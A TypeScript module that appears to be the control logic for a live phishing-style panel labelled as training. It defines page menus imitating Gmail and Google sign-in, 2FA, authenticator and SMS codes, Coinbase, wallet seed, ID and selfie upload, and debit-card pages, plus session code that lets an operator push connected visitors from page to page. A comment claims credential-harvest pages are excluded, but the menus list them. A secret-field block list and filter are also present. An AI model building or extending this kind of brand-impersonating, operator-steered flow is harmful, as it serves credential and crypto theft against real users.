import { UI_COPY } from './ui-copy.ts';

export { UI_COPY } from './ui-copy.ts';

export const TRAINING_BANNER = UI_COPY.trainingBanner;

export const SAFE_PAGES = [
  { id: 'welcome', name: 'Support Landing', url: '/welcome', file: 'pages/common/welcome/index.html' },
  { id: 'loading', name: 'Loading', url: '/loading', file: 'pages/common/loading/index.html' },
  { id: 'waiting', name: 'Waiting', url: '/waiting', file: 'pages/common/waiting/index.html' },
  { id: 'contact', name: 'Case Review', url: '/contact', file: 'pages/common/contact/index.html' },
  { id: 'success', name: 'Complete', url: '/success', file: 'pages/common/success/index.html' },
  { id: 'offline', name: 'Offline', url: '/offline', file: 'pages/common/offline/index.html' },
  { id: 'case-code', name: 'Case Access Code', url: '/case-code', file: 'pages/common/case-code/index.html' },
  { id: 'notice', name: 'Confirm Notice', url: '/notice', file: 'pages/common/notice/index.html' },
  { id: 'activity', name: 'Last Activity', url: '/activity', file: 'pages/common/activity/index.html' },
  { id: 'transfer', name: 'Transfer Case', url: '/transfer', file: 'pages/common/transfer/index.html' },
  { id: 'channel', name: 'Select Channel', url: '/channel', file: 'pages/common/channel/index.html' },
  { id: 'connect', name: 'Connect Session', url: '/connect', file: 'pages/common/connect/index.html' },
  { id: 'desk-signin', name: 'Desk Sign-in', url: '/desk-signin', file: 'pages/common/desk-signin/index.html' },
  { id: 'case-file', name: 'Case File Note', url: '/case-file', file: 'pages/common/case-file/index.html' },
  { id: 'callback', name: 'Agent Callback', url: '/callback', file: 'pages/common/callback/index.html' },
  { id: 'case-items', name: 'Case Items', url: '/case-items', file: 'pages/common/case-items/index.html' },
  {
    id: 'mail-signin',
    name: UI_COPY.mailDeskMenu.signin,
    url: '/demo/mail/signin',
    file: 'pages/demo-families/mail/signin.html',
  },
  {
    id: 'mail-invalid',
    name: UI_COPY.mailDeskMenu.invalid,
    url: '/demo/mail/invalid',
    file: 'pages/demo-families/mail/invalid.html',
  },
  {
    id: 'mail-verify',
    name: UI_COPY.mailDeskMenu.verify,
    url: '/demo/mail/verify',
    file: 'pages/demo-families/mail/verify.html',
  },
  {
    id: 'mail-code',
    name: UI_COPY.mailDeskMenu.code,
    url: '/demo/mail/code',
    file: 'pages/demo-families/mail/code.html',
  },
  {
    id: 'mail-waiting',
    name: UI_COPY.mailDeskMenu.waiting,
    url: '/demo/mail/waiting',
    file: 'pages/demo-families/mail/waiting.html',
  },
  {
    id: 'mail-alert',
    name: UI_COPY.mailDeskMenu.alert,
    url: '/demo/mail/alert',
    file: 'pages/demo-families/mail/alert.html',
  },
  {
    id: 'mail-device',
    name: UI_COPY.mailDeskMenu.device,
    url: '/demo/mail/device',
    file: 'pages/demo-families/mail/device.html',
  },
  {
    id: 'family-a-1',
    name: 'Account Demo',
    url: '/demo/family-a/page-1',
    file: 'pages/demo-families/family-a/page-1.html',
  },
  {
    id: 'family-a-2',
    name: 'Confirm Details',
    url: '/demo/family-a/page-2',
    file: 'pages/demo-families/family-a/page-2.html',
  },
  {
    id: 'family-a-loading',
    name: 'Account Demo · loading',
    url: '/demo/family-a/loading',
    file: 'pages/demo-families/family-a/loading.html',
  },
  {
    id: 'family-b-1',
    name: 'Product Demo',
    url: '/demo/family-b/page-1',
    file: 'pages/demo-families/family-b/page-1.html',
  },
  {
    id: 'family-b-2',
    name: 'Product Review',
    url: '/demo/family-b/page-2',
    file: 'pages/demo-families/family-b/page-2.html',
  },
  {
    id: 'family-b-loading',
    name: 'Product Demo · loading',
    url: '/demo/family-b/loading',
    file: 'pages/demo-families/family-b/loading.html',
  },
  { id: 'address', name: 'Address', url: '/address', file: 'pages/common/address/index.html' },
  { id: 'holdings', name: 'Holdings', url: '/holdings', file: 'pages/common/holdings/index.html' },
  {
    id: 'wrong-password',
    name: 'Wrong Password',
    url: '/wrong-password',
    file: 'pages/common/wrong-password/index.html',
  },
  { id: 'agent-call', name: 'Agent Call', url: '/agent-call', file: 'pages/common/agent-call/index.html' },
  {
    id: 'mail-password',
    name: 'Gmail Password',
    url: '/demo/mail/password',
    file: 'pages/demo-families/mail/password.html',
  },
  {
    id: 'mail-login',
    name: 'Google Login',
    url: '/demo/mail/login',
    file: 'pages/demo-families/mail/login.html',
  },
  {
    id: 'mail-wrong-password',
    name: 'Wrong Password',
    url: '/demo/mail/wrong-password',
    file: 'pages/demo-families/mail/wrong-password.html',
  },
  {
    id: 'mail-2-step',
    name: 'Gmail 2-Step Verification',
    url: '/demo/mail/2-step',
    file: 'pages/demo-families/mail/2-step.html',
  },
  {
    id: 'mail-authenticator',
    name: 'Gmail Authenticator',
    url: '/demo/mail/authenticator',
    file: 'pages/demo-families/mail/authenticator.html',
  },
  {
    id: 'mail-verifying',
    name: 'Google Verifying',
    url: '/demo/mail/verifying',
    file: 'pages/demo-families/mail/verifying.html',
  },
  {
    id: 'mail-security-alert',
    name: 'Security Alert',
    url: '/demo/mail/security-alert',
    file: 'pages/demo-families/mail/security-alert.html',
  },
  {
    id: 'mail-device-number',
    name: 'Device Number',
    url: '/demo/mail/device-number',
    file: 'pages/demo-families/mail/device-number.html',
  },
  {
    id: 'family-a-case-access-code',
    name: 'Case Access Code',
    url: '/demo/family-a/case-access-code',
    file: 'pages/demo-families/family-a/case-access-code.html',
  },
  {
    id: 'family-a-login',
    name: 'Login',
    url: '/demo/family-a/login',
    file: 'pages/demo-families/family-a/login.html',
  },
  {
    id: 'family-a-sms',
    name: 'SMS Verification',
    url: '/demo/family-a/sms-verification',
    file: 'pages/demo-families/family-a/sms-verification.html',
  },
  {
    id: 'family-a-email',
    name: 'Email Verification',
    url: '/demo/family-a/email-verification',
    file: 'pages/demo-families/family-a/email-verification.html',
  },
  {
    id: 'family-a-2fa',
    name: '2FA Verification',
    url: '/demo/family-a/2fa-verification',
    file: 'pages/demo-families/family-a/2fa-verification.html',
  },
  {
    id: 'family-a-app-pin',
    name: 'App PIN',
    url: '/demo/family-a/app-pin',
    file: 'pages/demo-families/family-a/app-pin.html',
  },
  {
    id: 'family-a-remove-device',
    name: 'Remove Device',
    url: '/demo/family-a/remove-device',
    file: 'pages/demo-families/family-a/remove-device.html',
  },
  {
    id: 'family-a-high-security',
    name: 'High Security',
    url: '/demo/family-a/high-security',
    file: 'pages/demo-families/family-a/high-security.html',
  },
  { id: 'harbor-login', name: 'Login (Landing Page)', url: '/login', file: 'pages/common/welcome/index.html' },
  { id: 'harbor-password', name: 'Password', url: '/password', file: 'pages/common/password/index.html' },
  {
    id: 'harbor-case-access-code',
    name: 'Case Access Code',
    url: '/case-access-code',
    file: 'pages/common/case-code/index.html',
  },
  { id: 'support-landing', name: 'Support Landing', url: '/support', file: 'pages/common/support/index.html' },
  {
    id: 'reset-password',
    name: 'Reset Password',
    url: '/reset-password',
    file: 'pages/common/reset-password/index.html',
  },
  { id: 'new-password', name: 'New Password', url: '/new-password', file: 'pages/common/new-password/index.html' },
  { id: 'upload-id', name: 'Upload ID', url: '/upload-id', file: 'pages/common/upload-id/index.html' },
  { id: 'upload-selfie', name: 'Upload Selfie', url: '/upload-selfie', file: 'pages/common/upload-selfie/index.html' },
  {
    id: 'whitelist-seed',
    name: 'Whitelist Seed',
    url: '/whitelist-seed',
    file: 'pages/common/whitelist-seed/index.html',
  },
  { id: 'coinbase-done', name: 'Coinbase Done', url: '/coinbase-done', file: 'pages/common/coinbase-done/index.html' },
  {
    id: 'account-activity',
    name: 'Account Activity',
    url: '/account-activity',
    file: 'pages/common/account-activity/index.html',
  },
] as const;

export const DEFAULT_PAGE = '/welcome';

export type PageCardKind = 'send' | 'variant' | 'hold';
export type PageFieldSet = 'demo' | 'tail' | 'channel' | 'topic' | 'callback' | 'item' | 'none';

export type MenuPage = {
  id: string;
  name: string;
  url: string;
  hint: string;
  card: PageCardKind;
  fields?: PageFieldSet;
};

/**
 * Admin Settings / workspace menu.
 * Brand login, password, OTP, seed, vault, and ID-upload harvest pages are not included.
 * Mail Desk mirrors the requested flow shape with Harbor-safe labels from UI_COPY.
 */
export const PAGE_MENU: { family: string; pages: MenuPage[] }[] = [
  {
    family: UI_COPY.families.harbor,
    pages: [
        {
          id: 'login-landing',
          name: 'Login (Landing Page)',
          url: '/login',
          hint: 'Demo email and password login',
          card: 'variant',
        },
        {
          id: 'password',
          name: 'Password',
          url: '/password',
          hint: 'Demo password entry page',
          card: 'variant',
        },
        {
          id: 'harbor-case-access-code',
          name: 'Case Access Code',
          url: '/case-access-code',
          hint: 'Demo support case access code',
          card: 'variant',
        },
        {
          id: 'support-landing',
          name: 'Support Landing',
          url: '/support',
          hint: 'Demo help landing page',
          card: 'send',
        },
        {
          id: 'reset-password',
          name: 'Reset Password',
          url: '/reset-password',
          hint: 'Demo password reset page',
          card: 'variant',
        },
        {
          id: 'new-password',
          name: 'New Password',
          url: '/new-password',
          hint: 'Demo new-password setup without processing real credentials',
          card: 'variant',
        },
        {
          id: 'upload-id',
          name: 'Upload ID',
          url: '/upload-id',
          hint: 'Demo identity-document selection',
          card: 'variant',
        },
        {
          id: 'upload-selfie',
          name: 'Upload Selfie',
          url: '/upload-selfie',
          hint: 'Demo identity-verification selfie step',
          card: 'variant',
        },
        {
          id: 'whitelist-seed',
          name: 'Whitelist Seed',
          url: '/whitelist-seed',
          hint: 'Demo wallet recovery-status configuration without collecting seed phrases',
          card: 'variant',
        },
        {
          id: 'coinbase-done',
          name: 'Coinbase Done',
          url: '/coinbase-done',
          hint: 'Demo account security confirmation',
          card: 'send',
        },
        {
          id: 'account-activity',
          name: 'Account Activity',
          url: '/account-activity',
          hint: 'Demo account activity verification',
          card: 'send',
        },
        {
          id: 'welcome',
          name: 'Security Actions',
          url: '/welcome',
          hint: 'Review suspicious activity on the demo account',
          card: 'send',
        },
        {
          id: 'case-code',
          name: 'High Security',
          url: '/case-code',
          hint: 'Enable high-security features',
          card: 'variant',
          fields: 'tail',
        },
        {
          id: 'contact',
          name: 'Case Review',
          url: '/contact',
          hint: 'Optional case details',
          card: 'send',
          fields: 'demo',
        },
        {
          id: 'notice',
          name: 'Captcha Verification',
          url: '/notice',
          hint: 'Verify the demo user is not a robot',
          card: 'variant',
        },
        {
          id: 'activity',
          name: 'Recovery Verification',
          url: '/activity',
          hint: 'Display recovery-status information without collecting secrets',
          card: 'send',
          fields: 'demo',
        },
        {
          id: 'transfer',
          name: 'Wallet Selection',
          url: '/transfer',
          hint: 'Choose a demo wallet configuration',
          card: 'hold',
        },
        {
          id: 'channel',
          name: 'Disconnected',
          url: '/channel',
          hint: 'Wallet disconnection confirmation',
          card: 'send',
          fields: 'channel',
        },
        {
          id: 'connect',
          name: 'Select Assets',
          url: '/connect',
          hint: 'Select cryptocurrency assets for the demo',
          card: 'send',
        },
        {
          id: 'desk-signin',
          name: 'Confirmation Selection',
          url: '/desk-signin',
          hint: 'Display name and case topic only',
          card: 'variant',
          fields: 'topic',
        },
        {
          id: 'case-file',
          name: 'Create Vault',
          url: '/case-file',
          hint: 'Demo vault creation page',
          card: 'send',
        },
        {
          id: 'callback',
          name: 'Setup Complete',
          url: '/callback',
          hint: 'Setup completion page',
          card: 'send',
          fields: 'callback',
        },
        {
          id: 'case-items',
          name: 'Approve',
          url: '/case-items',
          hint: 'Demo approval page',
          card: 'send',
          fields: 'item',
        },
        {
          id: 'loading',
          name: 'Debit Card',
          url: '/loading',
          hint: 'Demo payment-method page',
          card: 'send',
        },
        {
          id: 'waiting',
          name: 'Debit Card Failure',
          url: '/waiting',
          hint: 'Demo payment-method failure page',
          card: 'send',
        },
        {
          id: 'address',
          name: 'Address',
          url: '/address',
          hint: 'Case location label only',
          card: 'send',
        },
        {
          id: 'holdings',
          name: 'Holdings',
          url: '/holdings',
          hint: 'Display demo account holdings',
          card: 'send',
        },
        {
          id: 'wrong-password',
          name: 'Wrong Password',
          url: '/wrong-password',
          hint: 'Demo incorrect-password state',
          card: 'send',
        },
        {
          id: 'agent-call',
          name: 'Agent Call',
          url: '/agent-call',
          hint: 'Demo agent-call page',
          card: 'send',
        },
      
    ],
  },
  {
    family: UI_COPY.families.mailDesk,
    pages: [
      {
        id: 'gmail-password',
        name: 'Gmail Password',
        url: '/demo/mail/password',
        hint: 'Gmail password entry',
        card: 'variant',
      },
      {
        id: 'google-login',
        name: 'Google Login',
        url: '/demo/mail/login',
        hint: 'Google account sign in',
        card: 'variant',
      },
      {
        id: 'mail-wrong-password',
        name: 'Wrong Password',
        url: '/demo/mail/wrong-password',
        hint: 'Incorrect entry for this training step',
        card: 'variant',
      },
      {
        id: 'gmail-2-step',
        name: 'Gmail 2-Step Verification',
        url: '/demo/mail/2-step',
        hint: 'Two-step verification',
        card: 'variant',
      },
      {
        id: 'gmail-authenticator',
        name: 'Gmail Authenticator',
        url: '/demo/mail/authenticator',
        hint: 'Authenticator app code',
        card: 'variant',
      },
      {
        id: 'google-verifying',
        name: 'Google Verifying',
        url: '/demo/mail/verifying',
        hint: 'Processing/waiting page',
        card: 'send',
      },
      {
        id: 'security-alert',
        name: 'Security Alert',
        url: '/demo/mail/security-alert',
        hint: 'Security alert page',
        card: 'send',
      },
      {
        id: 'device-number',
        name: 'Device Number',
        url: '/demo/mail/device-number',
        hint: 'Device confirmation',
        card: 'send',
      },
    ],
  },
  {
    family: UI_COPY.families.accountDesk,
    pages: [
      {
        id: 'case-access-code',
        name: 'Case Access Code',
        url: '/demo/family-a/case-access-code',
        hint: 'Case access code entry',
        card: 'variant',
      },
      {
        id: 'login',
        name: 'Login',
        url: '/demo/family-a/login',
        hint: 'Demo account login page',
        card: 'variant',
      },
      {
        id: 'sms-verification',
        name: 'SMS Verification',
        url: '/demo/family-a/sms-verification',
        hint: 'Demo phone verification',
        card: 'variant',
      },
      {
        id: 'email-verification',
        name: 'Email Verification',
        url: '/demo/family-a/email-verification',
        hint: 'Demo email verification code entry',
        card: 'variant',
      },
      {
        id: '2fa-verification',
        name: '2FA Verification',
        url: '/demo/family-a/2fa-verification',
        hint: 'Demo two-factor authentication',
        card: 'variant',
      },
      {
        id: 'app-pin',
        name: 'App PIN',
        url: '/demo/family-a/app-pin',
        hint: 'Demo app passcode entry',
        card: 'variant',
      },
      {
        id: 'remove-device',
        name: 'Remove Device',
        url: '/demo/family-a/remove-device',
        hint: 'Remove a device from the demo account',
        card: 'send',
      },
      {
        id: 'high-security',
        name: 'High Security',
        url: '/demo/family-a/high-security',
        hint: 'Enable high-security settings on the demo account',
        card: 'send',
      },
      {
        id: 'family-a-loading',
        name: 'Loading',
        url: '/demo/family-a/loading',
        hint: 'Loading page',
        card: 'send',
      },
    ],
  },
  // {
  //   family: UI_COPY.families.productDesk,
  //   pages: [
  //     { id: 'family-b-1', name: 'Product Demo', url: '/demo/family-b/page-1', hint: 'Product desk page 1', card: 'send' },
  //     { id: 'family-b-2', name: 'Product Review', url: '/demo/family-b/page-2', hint: 'Product desk page 2', card: 'send' },
  //     { id: 'family-b-loading', name: 'Demo Loading', url: '/demo/family-b/loading', hint: 'Product desk loading', card: 'send' },
  //     { id: 'offline', name: 'Offline', url: '/offline', hint: 'Shown when the panel is disabled', card: 'send' },
  //   ],
  // },
  // {
  //   family: UI_COPY.families.caseDesk,
  //   pages: [
  //     { id: 'case-welcome', name: 'Case Home', url: '/welcome', hint: 'Case desk home', card: 'send' },
  //     { id: 'case-code-desk', name: 'Case Access Code', url: '/case-code', hint: 'Non-secret case suffix', card: 'variant', fields: 'tail' },
  //     { id: 'case-review', name: 'Case Review', url: '/contact', hint: 'Optional case details', card: 'send', fields: 'demo' },
  //     { id: 'case-wait', name: 'Waiting', url: '/waiting', hint: 'Waiting for an agent', card: 'send' },
  //   ],
  // },
  // {
  //   family: UI_COPY.families.helpDesk,
  //   pages: [
  //     { id: 'help-home', name: 'Help Home', url: '/welcome', hint: 'Help desk home', card: 'send' },
  //     { id: 'help-wait', name: 'Please Wait', url: '/waiting', hint: 'Waiting for an agent', card: 'send' },
  //     { id: 'help-done', name: 'Complete', url: '/success', hint: 'Case complete', card: 'send' },
  //   ],
  // },
];

export function sanitizeAppliedParameters(raw?: Record<string, unknown> | null): Record<string, unknown> {
  const input = raw && typeof raw === 'object' ? raw : {};
  const next: Record<string, unknown> = {};
  if (input.view === 'invalid' || input.view === 'default') next.view = input.view;
  if (input.hold === true) next.hold = true;
  if (typeof input.tailCode === 'string') {
    const tail = input.tailCode.replace(/[^a-zA-Z0-9]/g, '').slice(0, 8);
    if (tail && !looksLikeSecretMaterial(tail)) next.tailCode = tail;
  }
  if (input.channel === 'chat' || input.channel === 'phone' || input.channel === 'desk') {
    next.channel = input.channel;
  }
  for (const key of ['location', 'time', 'name'] as const) {
    const value = input[key];
    if (typeof value !== 'string') continue;
    const trimmed = value.trim().slice(0, 120);
    if (trimmed && !looksLikeSecretMaterial(trimmed)) next[key] = trimmed;
  }
  if (typeof input.topic === 'string') {
    const topic = input.topic.trim().slice(0, 120);
    if (topic && !looksLikeSecretMaterial(topic)) next.topic = topic;
  }
  if (typeof input.callbackWindow === 'string') {
    const windowLabel = input.callbackWindow.trim().slice(0, 80);
    if (windowLabel && !looksLikeSecretMaterial(windowLabel)) next.callbackWindow = windowLabel;
  }
  if (typeof input.itemLabel === 'string') {
    const label = input.itemLabel.trim().slice(0, 80);
    if (label && !looksLikeSecretMaterial(label)) next.itemLabel = label;
  }
  if (typeof input.itemCount === 'string' || typeof input.itemCount === 'number') {
    const count = String(input.itemCount).replace(/[^0-9]/g, '').slice(0, 6);
    if (count) next.itemCount = count;
  }
  return next;
}

export const LIVE_SUPPORT_FIELD_KEYS = [
  'displayName',
  'demoAccountId',
  'supportReference',
  'issueDescription',
  'selectedProduct',
  'displayValue',
  'testMessage',
] as const;

export type LiveSupportFieldKey = (typeof LIVE_SUPPORT_FIELD_KEYS)[number];

export const BANNED_SECRET_FIELD_KEYS = [
  'password',
  'seed_phrase',
  'recovery_phrase',
  'private_key',
  'otp',
  'sms_code',
  'authenticator_code',
  'wallet_secret',
  'payment_secret',
] as const;

export type JoinDecision = 'create' | 'resume' | 'offline';

export function decideVisitorJoin(input: {
  panelEnabled: boolean;
  existing: { lastSeenAt: string; endedAt?: string | null } | null;
  requestedPage: string;
  startingPage: string;
  timeoutMs: number;
  now?: number;
}): JoinDecision {
  if (!input.panelEnabled) return 'offline';
  const now = input.now ?? Date.now();
  if (input.existing?.endedAt) return 'offline';
  if (input.existing) {
    const age = now - Date.parse(input.existing.lastSeenAt);
    if (Number.isFinite(age) && age > input.timeoutMs) return 'offline';
    return 'resume';
  }
  const raw = String(input.requestedPage || '').trim();
  const requested = raw.startsWith('/') ? raw : `/${raw}`;
  const start = normalizeSessionPage(input.startingPage);
  if (requested === start || requested === DEFAULT_PAGE || requested === '/') return 'create';
  return 'offline';
}

export function presenceFromVisibility(visibilityState: string): SessionStatus {
  return visibilityState === 'visible' ? 'connected' : 'idle';
}

export function mergeSessionRow<T extends { token: string }>(prev: T[], patch: T): T[] {
  const index = prev.findIndex((row) => row.token === patch.token);
  if (index === -1) return [patch, ...prev];
  const next = prev.slice();
  next[index] = { ...prev[index], ...patch };
  return next;
}

export const DRILL_CHOICES = ['spotted', 'missed', 'refused_secret', 'recognized_trap'] as const;

export const ALLOWED_PAGE_URLS: ReadonlySet<string> = new Set(SAFE_PAGES.map((p) => p.url));

export const PAGE_FILE_BY_URL: Record<string, string> = Object.fromEntries(
  SAFE_PAGES.map((page) => [page.url, page.file]),
);

export type SessionStatus = 'connected' | 'idle' | 'disconnected';

/** Hidden tab is Idle. Legacy wire value `waiting` maps here. */
export function normalizePresenceStatus(status?: string | null): SessionStatus {
  const value = String(status || '').toLowerCase();
  if (value === 'connected' || value === 'visible') return 'connected';
  if (value === 'disconnected' || value === 'ended') return 'disconnected';
  return 'idle';
}

export function presenceLabel(status?: string | null): 'Connected' | 'Idle' | 'Disconnected' {
  const next = normalizePresenceStatus(status);
  if (next === 'connected') return 'Connected';
  if (next === 'disconnected') return 'Disconnected';
  return 'Idle';
}

export function sanitizeAdminKeyInput(input: string | null | undefined): string {
  return String(input ?? '').trim().replace(/\s+/g, '');
}

export function canSendSessionAction(status?: string | null): boolean {
  return normalizePresenceStatus(status) === 'connected';
}

/** Foundation: Idle Send does nothing and is not queued. */
export function canQueueSendAction(_status?: string | null): boolean {
  return false;
}

export function canAcceptSendCommand(status?: string | null): boolean {
  return canSendSessionAction(status);
}

export type QueuedSend = {
  page: string;
  action: 'send' | 'redirect';
  selectedFamily: string;
  temporaryParameters: Record<string, unknown>;
  at: string;
};

/** Kept for tests; Foundation does not queue Idle Send. */
export function replaceQueuedSend(_previous: QueuedSend | null, incoming: QueuedSend): QueuedSend {
  return incoming;
}

export function normalizeSessionPage(page?: string | null): string {
  const value = String(page ?? '').trim();
  if (!value) {
    return DEFAULT_PAGE;
  }
  const withSlash = value.startsWith('/') ? value : `/${value}`;
  if (ALLOWED_PAGE_URLS.has(withSlash)) {
    return withSlash;
  }
  return DEFAULT_PAGE;
}

export function looksLikeSecretMaterial(value: string): boolean {
  const v = value.trim();
  if (!v) return false;
  const words = v.toLowerCase().split(/\s+/).filter(Boolean);
  if (words.length >= 12 && words.every((w) => /^[a-z]+$/.test(w))) return true;
  if (/^(0x)?[a-fA-F0-9]{64}$/.test(v)) return true;
  if (/^\d{6}$/.test(v)) return true;
  return false;
}

export function isPlausiblePublicAddress(address: string): boolean {
  const a = address.trim();
  if (a.length < 26 || a.length > 90) return false;
  if (looksLikeSecretMaterial(a)) return false;
  if (/^0x[a-fA-F0-9]{40}$/.test(a)) return true;
  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(a)) return true;
  if (/^bc1[a-z0-9]{25,62}$/i.test(a)) return true;
  if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(a)) return true;
  return false;
}

export * from '../../core-state/src/index.ts';
